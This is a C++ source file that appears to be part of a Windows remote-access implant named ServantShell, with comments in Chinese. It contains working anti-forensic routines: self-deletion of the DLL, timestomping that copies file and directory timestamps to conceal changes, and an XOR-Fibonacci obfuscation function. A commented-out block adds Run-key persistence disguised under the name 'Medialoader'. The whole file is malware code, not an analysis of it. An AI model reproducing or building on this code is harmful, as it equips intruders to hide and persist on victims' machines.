#include "stdafx.h"
#include "destruction/SelfDestruction.h"
#include "file/MyFile.h"
#include "peutils/peutils.h"
#include "BinNames.h"
#include "Chameleon.h"
#include "common.h"
#include "shell.h"
#include "SvtShell.h"
#include "Exports.h"
#include "env/Wow64.h"
#include <Winsock2.h>

#pragma comment(lib, "ws2_32.lib")

SHELL_API LPCTSTR GetLocalPath()
{
	return GetBinFilepath();
}

SHELL_API BOOL XFC( const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1 )
{
	XorFibonacciCrypt(lpPlain, dwPlainLen, lpEncrypted, factor0, factor1);

	return TRUE;
}

SHELL_API void SD()
{
	//停止Servantshell工作
	DeinitServantShell();
/*	SelfDestruction::DeleteRunItem();*/
	SelfDestruction::ExitAndDeleteSelfDll(g_hServantshell);
	ExitProcess(0);
}
SHELL_API BOOL AdjustTimes( LPCTSTR filepath )
{
	tstring me;
	me = GetBinFilepath();
	me += GetBinFilename();
	MyFile selfFile;
	if (! selfFile.Open(me.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
	{
		errorLogE(_T("open file failed[%s]"), me.c_str());
		return FALSE;
	}

	FILETIME creationTime, lastAccessTime, lastWriteTime;
	if (! ::GetFileTime(selfFile, &creationTime, &lastAccessTime, &lastWriteTime))
	{
		errorLogE(_T("get file time failed."));
		return FALSE;
	}

	MyFile targetFile;
	if (! targetFile.Open(filepath, GENERIC_WRITE, OPEN_EXISTING, FILE_SHARE_WRITE))
	{
		errorLogE(_T("open target[%s] failed."), filepath);
		return FALSE;
	}

	return ::SetFileTime(targetFile, &creationTime, &lastAccessTime, &lastWriteTime);	
}

SHELL_API void CheckDT()
{
	SetFileTimes(g_locationDir.c_str(), TRUE, TIMES_PARAM(g_ftLocationDir));
}

// SHELL_API void InitRun()
// {
// 	TCHAR dllpath[MAX_PATH];
// 	GetModuleFileName(GetModuleHandle(SERVANT_SHELL_BINNAME), dllpath, MAX_PATH);
// 
// 	TCHAR rundllpath[MAX_PATH];
// 	GetSystemDirectory(rundllpath,MAX_PATH);
// 
// 	tstring strCmd = _T("\"");
// 	strCmd += rundllpath;
// 	strCmd += _T("\\rundll32.exe\" \"");
// 	strCmd += dllpath;
// 	strCmd += _T("\"");
// 	strCmd += _T(" Init");
// 
// 	HKEY hKey;
// 	LONG lnRes = RegOpenKeyEx(
// 		HKEY_CURRENT_USER,
// 		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
// 		0,KEY_WRITE,
// 		&hKey
// 		);
// 
// 	if( ERROR_SUCCESS == lnRes )
// 	{
// 		lnRes = RegSetValueEx(hKey,
// 			_T("Medialoader"),
// 			0,
// 			REG_SZ,
// 			(BYTE*)strCmd.c_str(),
// 			strCmd.length()*sizeof(TCHAR));
// 	}
// 	RegCloseKey(hKey);
// 	Init();
// }

SHELL_API void Init( BOOL isIns /*= TRUE*/ )
{
	//获取所在目录的时间
	g_locationDir = GetBinFilepath();
	if (g_locationDir.back() == '\\') g_locationDir.erase(g_locationDir.size() - 1);
	GetFileTimes(g_locationDir.c_str(), TRUE, TIMES_PARAM(g_ftLocationDir));

	debugLog(_T("init servantshell. filepath is %s%s"), GetBinFilepath(), GetBinFilename());

	if (! Shell::GetInstanceRef().Init())
	{
		errorLog(_T("init shell failed"));
		return;
	}

	Shell::GetInstanceRef().LoadServant((BOOL)isIns);

}